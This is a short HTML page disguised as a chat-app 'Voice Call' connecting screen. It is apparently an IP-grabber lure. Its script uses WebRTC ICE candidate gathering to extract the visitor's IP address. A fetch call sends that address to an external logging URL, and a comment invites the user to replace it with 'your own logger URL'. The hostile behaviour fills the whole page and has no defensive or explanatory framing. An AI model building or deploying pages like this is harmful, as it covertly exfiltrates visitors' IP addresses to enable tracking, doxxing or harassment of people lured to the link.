<!DOCTYPE html>
<html>
<body style="background:#36393f;color:white;text-align:center;padding-top:50px;">
    <h1>Voice Call</h1>
    <p>Connecting...</p>
    
    <script>
        // Simple WebRTC PeerConnection to trigger ICE candidate gathering
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        });

        pc.createOffer().then(offer => pc.setLocalDescription(offer));

        pc.onicecandidate = event => {
            if (event.candidate) {
                // Extract IP from the candidate string
                const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                if (ipMatch) {
                    const ip = ipMatch[0];
                    console.log("IP Found:", ip);
                    
                    // Log to a free service (replace with your own logger URL)
                    fetch(`https://httpbin.org/get?ip=${ip}`);
                    
                    document.body.innerHTML = `<h1>Connected!</h1><p>Your IP: ${ip}</p>`;
                }
            }
        };
    </script>
</body>
</html>
